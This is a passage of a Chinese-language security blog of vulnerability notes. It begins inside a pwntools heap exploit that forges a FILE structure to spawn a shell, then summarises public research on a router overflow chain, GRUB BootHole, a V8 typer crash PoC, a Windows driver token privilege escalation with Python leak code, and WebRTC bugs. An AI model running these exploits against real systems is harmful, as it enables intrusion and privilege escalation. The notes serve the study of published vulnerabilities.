class="line">    raw_input()</span><br><span class="line">    show(<span class="number">-5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'stdin'</span>]</span><br><span class="line">    lg(<span class="string">'libc'</span>,libc.address)</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io_list_all = libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">    <span class="comment">#show(-13)</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a'</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'b'</span>,<span class="string">'b'</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'c'</span>,p64(<span class="number">0x11</span>)*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'a'</span>,<span class="string">''</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Description:'</span>)</span><br><span class="line">    heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    lg(<span class="string">'heap'</span>,heap_addr)</span><br><span class="line">    add(<span class="number">1</span>,<span class="string">'b'</span>,<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'a'</span>,payload)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    fake_fd = <span class="number">0</span></span><br><span class="line">    fake_bk = io_list_all - <span class="number">0x10</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += pack_file_64(_flags = u64(<span class="string">'/bin/sh\0'</span>),</span><br><span class="line">                _IO_read_ptr = <span class="number">0x61</span>,</span><br><span class="line">                _IO_read_end = fake_fd,</span><br><span class="line">                _IO_read_base = fake_bk,</span><br><span class="line">                _IO_write_base = <span class="number">2</span>,</span><br><span class="line">                _IO_write_ptr = <span class="number">3</span>)</span><br><span class="line">    vtalbe = heap_addr + <span class="number">0xe0</span></span><br><span class="line">    payload += p64(vtalbe)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system) + p64(system)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'a'</span>,payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,<span class="string">'a'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">hack()</span><br></pre></td></tr></table></figure>
<h3 id="One-Line-JS"><a href="#One-Line-JS" class="headerlink" title="One Line JS"></a>One Line JS</h3><h2 id="实战栈溢出：三个漏洞搞定一台路由器"><a href="#实战栈溢出：三个漏洞搞定一台路由器" class="headerlink" title="实战栈溢出：三个漏洞搞定一台路由器"></a>实战栈溢出：三个漏洞搞定一台路由器</h2><p><a href="https://paper.seebug.org/269/" target="_blank" rel="noopener">https://paper.seebug.org/269/</a></p>
<p>三个漏洞是：</p>
<ul>
<li>snprintf使用不当造成的内存泄露，空闲堆会泄露出libc地址；</li>
<li>ini配置注入，利用换行注入，新注入的<code>server_addr</code>会覆盖前面配置；</li>
<li>重启Xware时会重新加载ini配置，这里还有个栈溢出，strcpy造成的典型栈溢；</li>
</ul>
<p>利用思路主要是：</p>
<ul>
<li>信息泄露出libc_addr；</li>
<li>找到libc中系列gadget，填入ini配置中；</li>
<li>重启Xware触发栈溢出（PS:这些arm/mips的路由器中通常没有ASLR），pwned!</li>
</ul>
<h2 id="Grubbing-Secure-Boot-the-Wrong-Way-CVE-2020-10713"><a href="#Grubbing-Secure-Boot-the-Wrong-Way-CVE-2020-10713" class="headerlink" title="Grubbing Secure Boot the Wrong Way: CVE-2020-10713"></a>Grubbing Secure Boot the Wrong Way: CVE-2020-10713</h2><p><a href="https://capsule8.com/blog/grubbing-secure-boot-the-wrong-way-cve-2020-10713/" target="_blank" rel="noopener">https://capsule8.com/blog/grubbing-secure-boot-the-wrong-way-cve-2020-10713/</a></p>
<p><a href="https://www.zdnet.com/article/boothole-attack-impacts-windows-and-linux-systems-using-grub2-and-secure-boot/" target="_blank" rel="noopener">https://www.zdnet.com/article/boothole-attack-impacts-windows-and-linux-systems-using-grub2-and-secure-boot/</a></p>
<h3 id="什么是GRUB"><a href="#什么是GRUB" class="headerlink" title="什么是GRUB"></a>什么是GRUB</h3><p>GNU GRUB（简称“GRUB”）是一个来自GNU项目的启动引导程序。 GRUB是多启动规范的实现，它允许用户可以在计算机内同时拥有多个操作系统，并在计算机启动时选择希望运行的操作系统。 GRUB可用于选择操作系统分区上的不同内核，也可用于向这些内核传递启动参数。</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>GRUB安全启动的时候需要验证所有固件是否安全，启动过程如下：</p>
<ol>
<li>固件加载包含可信任证书（shim）的smol first-stage bootloader binary;</li>
<li>Shim加载GRUB二进制文件（另一个引导程序），并使用证书对其进行验证;</li>
<li>GRUB加载位于grub.cfg（在本例中为Chekov的配置文件）中的所有必需配置，该配置指向可以加载内核映像的位置；</li>
<li>GRUB通过存储在固件的信任数据库（分别为db和dbx，分别是授权和禁止的签名数据库）中的密钥来验证内核；</li>
<li>GRUB将控制权移交给内核；内核启动操作系统。</li>
</ol>
<p>在第三步的时候，使用通过flex和bison生成的解释器来读文件，当配置文件过大，可以栈缓冲区溢出；直接溢，它没有ASLR等缓解措施。</p>
<p>利用条件是，用户有足够高的权限、机器会重启。</p>
<h3 id="产生影响"><a href="#产生影响" class="headerlink" title="产生影响"></a>产生影响</h3><p>The company estimates that every Linux distribution is impacted by this vulnerability, as all use GRUB2 bootloaders that read commands from an external grub.cfg file.</p>
<h2 id="Unpatchable-Secure-Enclave-Processor-SEP-chip-vulnerability-in-iOS"><a href="#Unpatchable-Secure-Enclave-Processor-SEP-chip-vulnerability-in-iOS" class="headerlink" title="Unpatchable Secure Enclave Processor (SEP) chip vulnerability in iOS"></a>Unpatchable Secure Enclave Processor (SEP) chip vulnerability in iOS</h2><p><a href="https://androidrookies.com/team-pangu-demonstrates-unpatchable-secure-enclave-processor-sep-chip-vulnerability-in-ios/" target="_blank" rel="noopener">https://androidrookies.com/team-pangu-demonstrates-unpatchable-secure-enclave-processor-sep-chip-vulnerability-in-ios/</a></p>
<p>SEP (Secure Enclave Processor) is an independent coprocessor that provides an extra layer of security to Apple iPhones and iPads.</p>
<p>硬件漏洞，可以控制寄存器，绕过安全措施，具体文中也没说咱也不知道。</p>
<h2 id="我又来看浏览器了"><a href="#我又来看浏览器了" class="headerlink" title="我又来看浏览器了"></a>我又来看浏览器了</h2><h3 id="Chromium一个洞"><a href="#Chromium一个洞" class="headerlink" title="Chromium一个洞"></a>Chromium一个洞</h3><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1072171" target="_blank" rel="noopener">Issue 1072171: Security: missing the -0 case when intersecting and computing the Type::Range in NumberMax</a></p>
<p>poc:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> confused;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">-0.0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        confused = <span class="built_in">Math</span>.max(<span class="number">-1</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    confused[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">crash();</span><br><span class="line">%OptimizeFunctionOnNextCall(crash);</span><br><span class="line">crash();</span><br></pre></td></tr></table></figure>
<p>In the cases that, for example, rhx is Type::MinusZero the following code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rhs = Type::Intersect(rhs, cache_-&gt;kInteger, zone());</span><br></pre></td></tr></table></figure>
<p>The aforementioned code will wrongly remove the Type::MinusZero and therefore rhs.IsNone() will yield true on the following lines of code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> min = <span class="built_in">std</span>::max(lhs.IsNone() ? -V8_INFINITY : lhs.Min(),</span><br><span class="line">                       rhs.IsNone() ? -V8_INFINITY : rhs.Min());</span><br><span class="line"><span class="keyword">double</span> max = <span class="built_in">std</span>::max(lhs.IsNone() ? -V8_INFINITY : lhs.Max(),</span><br><span class="line">                       rhs.IsNone() ? -V8_INFINITY : rhs.Max());</span><br><span class="line">type = Type::Union(type, Type::Range(min, max, zone()), zone());</span><br></pre></td></tr></table></figure>
<p>This will lead to cases in which the Type::Range(min, max, zone()) is wrongly computed due to the first run being Range(-1, -1) and the next Typer run, before crashing, starting on Range(1, 1).</p>
<h3 id="Speculation-in-JavaScriptCore"><a href="#Speculation-in-JavaScriptCore" class="headerlink" title="Speculation in JavaScriptCore"></a>Speculation in JavaScriptCore</h3><p><a href="https://webkit.org/blog/10308/speculation-in-javascriptcore/" target="_blank" rel="noopener">Speculation in JavaScriptCore</a></p>
<p>JavaScriptCore has four tiers:</p>
<ul>
<li>The LLInt, or low-level interpreter, which is an interpreter that obeys JIT compiler ABI. It runs on the same stack as the JITs and uses a known set of registers and stack locations for its internal state.</li>
<li>The Baseline JIT, also known as a bytecode template JIT, which emits a template of machine code for each bytecode instruction without trying to reason about relationships between multiple instructions in the function. It compiles whole functions, which makes it a method JIT. Baseline does no OSR speculations but does have a handful of diamond speculations based on profiling from the LLInt.</li>
<li>The DFG JIT, or data flow graph JIT, which does OSR speculation based on profiling from the LLInt, Baseline, and in some rare cases even using profiling data collected by the DFG JIT and FTL JIT. It may OSR exit to either baseline or LLInt. The DFG has a compiler IR called DFG IR, which allows for sophisticated reasoning about speculation. The DFG avoids doing expensive optimizations and makes many compromises to enable fast code generation.</li>
<li>The FTL JIT, or faster than light JIT, which does comprehensive compiler optimizations. It’s designed for peak throughput. The FTL never compromises on throughput to improve compile times. This JIT reuses most of the DFG JIT’s optimizations and adds lots more. The FTL JIT uses multiple IRs (DFG IR, DFG SSA IR, B3 IR, and Assembly IR).</li>
</ul>
<h2 id="Issue-2035-iOS-PPL-bypass-due-to-incorrect-argument-verification-in-pmap-protect-options-internal-and-pmap-remove-options-internal"><a href="#Issue-2035-iOS-PPL-bypass-due-to-incorrect-argument-verification-in-pmap-protect-options-internal-and-pmap-remove-options-internal" class="headerlink" title="Issue 2035: iOS: PPL bypass due to incorrect argument verification in pmap_protect_options_internal() and pmap_remove_options_internal()"></a>Issue 2035: iOS: PPL bypass due to incorrect argument verification in pmap_protect_options_internal() and pmap_remove_options_internal()</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2035" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=2035</a></p>
<h2 id="One-Byte-to-rule-them-all"><a href="#One-Byte-to-rule-them-all" class="headerlink" title="One Byte to rule them all"></a>One Byte to rule them all</h2><p><a href="https://googleprojectzero.blogspot.com/2020/07/one-byte-to-rule-them-all.html?m=1" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2020/07/one-byte-to-rule-them-all.html?m=1</a></p>
<h2 id="Technical-analysis-CVE-2020-15654-and-a-history-of-Firefox-“Browser-Lock”-bugs"><a href="#Technical-analysis-CVE-2020-15654-and-a-history-of-Firefox-“Browser-Lock”-bugs" class="headerlink" title="Technical analysis: CVE-2020-15654 and a history of Firefox “Browser Lock” bugs"></a>Technical analysis: CVE-2020-15654 and a history of Firefox “Browser Lock” bugs</h2><p><a href="https://news.sophos.com/en-us/2020/08/03/technical-analysis-cve-2020-15654-and-a-history-of-firefox-browser-lock-bugs/?cmp=30728" target="_blank" rel="noopener">https://news.sophos.com/en-us/2020/08/03/technical-analysis-cve-2020-15654-and-a-history-of-firefox-browser-lock-bugs/?cmp=30728</a></p>
<p>主要讲了“浏览器前端漏洞”，恶意网站DoS、欺骗，自定义光标 –解决措施–&gt; 黄条警告。</p>
<h2 id="Exploiting-SKYSEA-Activity-Monitor"><a href="#Exploiting-SKYSEA-Activity-Monitor" class="headerlink" title="Exploiting SKYSEA Activity Monitor"></a>Exploiting SKYSEA Activity Monitor</h2><p><a href="https://acru3l.github.io/2020/08/03/exploiting-activity-monitor-driver/" target="_blank" rel="noopener">Exploiting SKYSEA Activity Monitor</a></p>
<h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>因为下面这个原因，所以有个地方的地址是用户空间可以控制的；</p>
<blockquote>
<p>METHOD_NEITHER<br>Specifies neither buffered nor direct I/O. The I/O manager does not provide any system buffers or MDLs. The IRP supplies the user-mode virtual addresses of the input and output buffers that were specified to DeviceIoControl or IoBuildDeviceIoControlRequest, without validating or mapping them.</p>
</blockquote>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li>漏洞点有任意地址写为null；</li>
<li>想要转化为rrw，要控制_d或_q；</li>
<li>d取决于SkyAMDrv.sys中三个全局变量，two DWORD integers X, Y and a pointer P to a data structure. These three variables are placed in this order: X, Y, and P are at SkyAMDrv+1BA28, SkyAMDrv+1BA2C, and SkyAMDrv+1BA30 respectively. 假设P指向G结构，_d的值跟G+44有关；</li>
<li>覆盖P为用户空间可控的地址，那么就可以在用户空间伪造G，然后控制G+44就可以控制_d，从而rrw；</li>
<li>有了rrw，we can leak the address of an access token in the Kernel space like you do with Process Explorer included in the Sysinternals Suite. Then we can overwrite the privileges fields in the access token with 0xffffffffffffffff. See for example, @alxbl’s <a href="https://segfault.me/2019/05/24/exploiting-an-arbitrary-write-to-escalate-privileges/" target="_blank" rel="noopener">blog</a> for details.</li>
<li>写进程token为0xffffffffffffffff即可提权，就用户级API可以泄露，代码如下：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">STATUS_INFO_LENGTH_MISMATCH = <span class="number">0xC0000004</span></span><br><span class="line">SystemExtendedHandleInformation = <span class="number">64</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token_address</span><span class="params">()</span>:</span></span><br><span class="line">    hProc = HANDLE(kernel32.GetCurrentProcess())</span><br><span class="line">    pid = kernel32.GetCurrentProcessId()</span><br><span class="line">    h = HANDLE()</span><br><span class="line">    res = OpenProcessToken(hProc, TOKEN_QUERY, byref(h))</span><br><span class="line">    <span class="keyword">if</span> res == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'[-] Error getting token handle: '</span>)</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Find the handles associated with the current process.</span></span><br><span class="line">    q = STATUS_INFO_LENGTH_MISMATCH</span><br><span class="line">    out = DWORD(<span class="number">0</span>)</span><br><span class="line">    sz = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> q == STATUS_INFO_LENGTH_MISMATCH:</span><br><span class="line">        sz += <span class="number">0x1000</span></span><br><span class="line">        handle_info = (c_ubyte * sz)()</span><br><span class="line">        q = ntdll.NtQuerySystemInformation(</span><br><span class="line">                SystemExtendedHandleInformation,</span><br><span class="line">                byref(handle_info),</span><br><span class="line">                sz,</span><br><span class="line">                byref(out)</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parse handle_info to retrieve handles for the current PID</span></span><br><span class="line">    handles = find_handles(pid, handle_info)</span><br><span class="line">    hToken = filter(<span class="keyword">lambda</span> x: x[<span class="number">0</span>] == pid <span class="keyword">and</span> x[<span class="number">2</span>] == h.value, handles)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(hToken) != <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> hToken[<span class="number">0</span>][<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>Windows进程token结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt -r nt!_TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">      +0x000 SourceName       : [8] Char</span><br><span class="line">      +0x008 SourceIdentifier : _LUID</span><br><span class="line">         +0x000 LowPart          : Uint4B</span><br><span class="line">         +0x004 HighPart         : Int4B</span><br><span class="line">      ... snip ...</span><br><span class="line">      +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">         +0x000 Present          : Uint8B // Privileges to consider</span><br><span class="line">         +0x008 Enabled          : Uint8B // Privileges that are granted</span><br><span class="line">         +0x010 EnabledByDefault : Uint8B // Privileges granted to child processes</span><br><span class="line">      ... snip ...</span><br></pre></td></tr></table></figure>
<h2 id="Exploiting-Android-Messengers-with-WebRTC-Part-1"><a href="#Exploiting-Android-Messengers-with-WebRTC-Part-1" class="headerlink" title="Exploiting Android Messengers with WebRTC: Part 1"></a>Exploiting Android Messengers with WebRTC: Part 1</h2><p><a href="https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html</a></p>
<blockquote>
<p>WebRTC is an open source video conferencing solution used by a variety of software including browsers, messaging clients and streaming services.</p>
</blockquote>
<p>这系列文章分析了WebRTC漏洞，CVE-2020-6389和CVE-2020-6387，在Messenger中的利用。</p>
<h3 id="CVE-2020-6389漏洞点分析"><a href="#CVE-2020-6389漏洞点分析" class="headerlink" title="CVE-2020-6389漏洞点分析"></a>CVE-2020-6389漏洞点分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (layer_info_it-&gt;second[temporal_idx] != <span class="number">-1</span> &amp;&amp;</span><br><span class="line">AheadOf&lt;<span class="keyword">uint16_t</span>&gt;(layer_info_it-&gt;second[temporal_idx], frame-&gt;id.picture_id)) &#123;</span><br><span class="line">      <span class="comment">// Not a newer frame. No subsequent layer info needs update.</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  ...</span><br><span class="line">   layer_info_it-&gt;second[temporal_idx] = frame-&gt;id.picture_id;</span><br></pre></td></tr></table></figure>
<p><code>layer_info_it-&gt;second[]</code>只有5个元素，而索引<code>temporal_idx</code>能取到7；但是<code>layer_info_it-&gt;second[]</code>是64位，<code>frame-&gt;id.picture_id</code>是16位，太小了，表示不了指针；</p>
<h3 id="CVE-2020-6387漏洞点分析"><a href="#CVE-2020-6387漏洞点分析" class="headerlink" title="CVE-2020-6387漏洞点分析"></a>CVE-2020-6387漏洞点分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> RTPExtensionType::kRtpExtensionVideoTiming: &#123;</span><br><span class="line">    <span class="comment">// Nullify 3 last entries: packetization delay and 2 network timestamps.</span></span><br><span class="line">    <span class="comment">// Each of them is 2 bytes.</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* p = WriteAt(extension.offset) + VideoSendTiming::kPacerExitDeltaOffset;    <span class="comment">// x + 7</span></span><br><span class="line">    <span class="built_in">memset</span>(</span><br><span class="line">        p,</span><br><span class="line">        <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有检查<code>WriteAt(extension.offset)</code>能写的空间是否大于13，所以有off by null。</p>
<h3 id="CVE-2020-6389能利用吗"><a href="#CVE-2020-6389能利用吗" class="headerlink" title="CVE-2020-6389能利用吗"></a>CVE-2020-6389能利用吗</h3><p>还真能，覆盖到下图<code>StunMessage</code>类的vector的<strong>end</strong>了，end是16位的。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="comment">//   pointer __begin_;</span></span><br><span class="line"><span class="comment">//   pointer __end_;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;StunAttribute&gt;&gt; attrs_;</span><br><span class="line"> ...</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">uint16_t</span> type_;</span><br><span class="line">  <span class="keyword">uint16_t</span> length_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> transaction_id_;</span><br><span class="line">  <span class="keyword">uint32_t</span> reduced_transaction_id_;</span><br><span class="line">  <span class="keyword">uint32_t</span> stun_magic_cookie_;</span><br></pre></td></tr></table></figure>
<p>但是，在典型配置中，WebRTC连接一端的攻击者不可能将STUN发送给另一端的用户，然后：“I asked Philipp Hancke of <a href="https://webrtchacks.com/" target="_blank" rel="noopener">webrtchacks</a> if he knew of a way. He suggested this <a href="https://github.com/fippo/tcp-mitm">method</a>, which involves specifying a TCP server controlled by the attacker as a potential routable path between two peers, called an ICE candidate. Both the attacker and target device will then communicate through this server, including STUN messages.”。</p>
<h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><p>Mark Brand suggested that it might be possible to use CVE-2020-6387 to accomplish this by setting the low bytes of a pointer to outgoing data to zero, causing out-of-bounds data to be sent instead of the actual data. This seemed like a promising approach, so I used IDA to look for potential objects.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RefCountedObject vtable;</span><br><span class="line"><span class="keyword">size_t</span> size_;</span><br><span class="line"><span class="keyword">size_t</span> Capacity_;</span><br><span class="line"><span class="built_in">std</span> :: <span class="built_in">unique_ptr</span> &lt;T []&gt; data_;</span><br></pre></td></tr></table></figure>
<p>I also thought about using CVE-2020-6387 to alter a vtable or a function pointer in order to read memory, cause behavior detectable by a crash oracle or perform offset-based exploitation that doesn’t require ASLR to be broken. I decided not to pursue this path, because the end result would depend on which functions and vtables are loaded at locations ending in zero, which varies greatly between builds.</p>
<p>最后决定找新的漏洞来绕过ASLR（下一Part）。</p>
<h2 id="Exploiting-Android-Messengers-with-WebRTC-Part-2"><a href="#Exploiting-Android-Messengers-with-WebRTC-Part-2" class="headerlink" title="Exploiting Android Messengers with WebRTC: Part 2"></a>Exploiting Android Messengers with WebRTC: Part 2</h2><p>上一Part的问题是，ASLR不太行，然后需要新的漏洞。</p>
<h3 id="CVE-2020-6831-–-usrsctp越界读"><a href="#CVE-2020-6831-–-usrsctp越界读" class="headerlink" title="CVE-2020-6831 – usrsctp越界读"></a>CVE-2020-6831 – usrsctp越界读</h3><p>usrsctp is an implementation of Stream Control Transmission Protocol (SCTP) used by WebRTC. Applications that use WebRTC can open data channels, which allow text or binary data to be transmitted from peer to peer. Data channels are often used to allow text messages to be exchanged during a video call, or to tell a peer when certain events have occurred, such as another peer disabling its camera. SCTP is the protocol that underlies data channels. In WebRTC, SCTP is analogous to RTP in that where RTP is used for audio and video content, SCTP is used for data.</p>
<p>但是这个洞需要client socket连接a listening socket，而我们只能socket连接socket。</p>
<h3 id="CVE-2020-6514"><a href="#CVE-2020-6514" class="headerlink" title="CVE-2020-6514"></a>CVE-2020-6514</h3><p>这个主要是，有一对void *指针，可以内存泄露。但是这个泄露，泄露不了库地址。</p>
<h3 id="Bug-376"><a href="#Bug-376" class="headerlink" title="Bug 376"></a>Bug 376</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (param_length &gt; <span class="keyword">sizeof</span>(aparam_buf)) &#123;</span><br><span class="line"> SCTPDBG(SCTP_DEBUG_ASCONF1, <span class="string">"handle_asconf: param length (%u) larger than buffer size!\n"</span>, param_length);</span><br><span class="line"> sctp_m_freem(m_ack);</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (param_length &lt;= <span class="keyword">sizeof</span>(struct sctp_paramhdr)) &#123;</span><br><span class="line"> SCTPDBG(SCTP_DEBUG_ASCONF1, <span class="string">"handle_asconf: param length (%u) too short\n"</span>, param_length);</span><br><span class="line"> sctp_m_freem(m_ack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是，第二块没有return，m_ack可以UaF。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_hdr</span> &#123;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">mh_next</span>;</span> <span class="comment">/* next buffer in chain */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">mh_nextpkt</span>;</span> <span class="comment">/* next chain in queue/record */</span></span><br><span class="line"> <span class="keyword">caddr_t</span>   mh_data; <span class="comment">/* location of data */</span></span><br><span class="line"> <span class="keyword">int</span>   mh_len; <span class="comment">/* amount of data in this mbuf */</span></span><br><span class="line"> <span class="keyword">int</span>   mh_flags; <span class="comment">/* flags; see below */</span></span><br><span class="line"> <span class="keyword">short</span>   mh_type; <span class="comment">/* type of data in this mbuf */</span></span><br><span class="line"> <span class="keyword">uint8_t</span>          pad[M_HDR_PAD];<span class="comment">/* word align                  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TAILQ_INSERT_TAIL(&amp;stcb-&gt;asoc.asconf_ack_sent, ack, next);</span><br></pre></td></tr></table></figure>
<p>现在UaF就是要内存重叠然后泄露，需要相同分配大小的块；</p>
